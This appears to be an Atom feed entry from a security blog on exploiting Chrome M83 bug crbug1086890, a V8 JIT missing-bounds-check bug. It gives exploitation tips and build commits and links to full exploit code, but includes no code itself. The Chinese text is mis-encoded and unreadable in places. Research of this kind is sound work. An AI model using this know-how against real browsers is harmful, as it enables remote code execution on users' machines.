    <content type="html"><![CDATA[<h2 id="bug-info"><a href="#bug-info" class="headerlink" title="bug info"></a>bug info</h2><p>æ¥è‡ªpj0çš„<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2046">glazunov</a>çš„æ´ï¼Œä¸€ä¸ªJITä¼˜åŒ–ä¸­çš„æ´ï¼Œç¼ºå°‘è¾¹ç•Œæ£€æŸ¥æœ€ç»ˆå¯¼è‡´oob r/wã€‚</p><a id="more"></a><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>æ¯”è¾ƒä¸å¥½çš„åœ°æ–¹å°±æ˜¯éœ€è¦å¤§æ¦‚çŒœä¸€ä¸‹é‚£ä¸ªoobarrayçš„elementsçš„åœ°å€ï¼Œä½¿å¾—æˆ‘ä»¬æƒ³ç”¨æ¥aar/wçš„arrayæˆ–è€…arraybufferè½åœ¨è¿™åé¢ï¼Œå¤§æ¦‚è°ƒæ•´ä¸ªåç§»ä½¿å¾—èƒ½å¤Ÿæ­£å¸¸è¯»å†™åˆ°å°±è¡Œã€‚</p><p>æµ‹è¯•ç‰ˆæœ¬:83.0.4103.61 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Commit: 88bff78e26dbd25dcbb342d4b07c7e66c0f048be</span><br><span class="line">Branch Base Commit: 8ad47e8d21f6866e4a37f47d83a860d41debf514</span><br><span class="line">Branch Base Position: 756066</span><br><span class="line">V8 Commit: 3b627511511f00c552ced504c1f182bdcc3480af</span><br><span class="line">V8 Version: 8.3.110.9</span><br><span class="line">V8 Position: 19</span><br><span class="line">Skia Commit: c3d05a789930913af94174961bc6f90894196f62</span><br></pre></td></tr></table></figure><ul><li>è°ƒè¯•ä¼šæ¯”è¾ƒéº»çƒ¦ç‚¹ï¼Œgdb ç›´æ¥èµ·è§¦å‘æœ‰é—®é¢˜ï¼ˆæˆ‘è¿™é‡Œæ˜¯ï¼‰ï¼Œæˆ‘æ˜¯å¼€äº†coredumpï¼Œç„¶åè§¦å‘crashçœ‹çœ‹å†…å­˜å•¥çš„è°ƒçš„ã€‚</li><li>biguint64 è¿˜æ˜¯ arraybufferéƒ½è¡Œï¼Œå–œæ¬¢å•¥ç”¨å•¥ã€‚</li><li>æƒ³æˆåŠŸç‡é«˜ï¼Œè¦ç”¨web workerï¼ˆæˆ‘è§‰å¾—ï¼‰ï¼Œè¦ä¹ˆæ­»çŒœå‡ ä¸ªåœ°å€ï¼Œè¦ä¹ˆéšæœºæ’å¤§è¿ã€‚</li></ul><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/crbug1086890/CleanShot%202020-08-27%20at%2011.26.03.png" alt="exploit linux d8"></p><p><a href="https://github.com/o0xmuhe/RealWorldPwn/tree/master/chrome_M83_crbug1086890_RCE">å®Œæ•´åˆ©ç”¨ä»£ç </a></p><hr><p>è§‰å¾—æœ‰ç”¨çš„æœ‹å‹å¯ä»¥æ‰“èµä¸€æ¯â˜•ï¸ :)</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;bug-info&quot;&gt;&lt;a href=&quot;#bug-info&quot; class=&quot;headerlink&quot; title=&quot;bug info&quot;&gt;&lt;/a&gt;bug info&lt;/h2&gt;&lt;p&gt;æ¥è‡ªpj0çš„&lt;a href=&quot;https://bugs.chromium.org/p/project-zero/issues/detail?id=2046&quot;&gt;glazunov&lt;/a&gt;çš„æ´ï¼Œä¸€ä¸ªJITä¼˜åŒ–ä¸­çš„æ´ï¼Œç¼ºå°‘è¾¹ç•Œæ£€æŸ¥æœ€ç»ˆå¯¼è‡´oob r/wã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="exploit" scheme="https://o0xmuhe.github.io/categories/exploit/"/>
    
    
    <category term="exploit" scheme="https://o0xmuhe.github.io/tags/exploit/"/>
    
    <category term="chrome" scheme="https://o0xmuhe.github.io/tags/chrome/"/>
    
  </entry>
  
</feed>
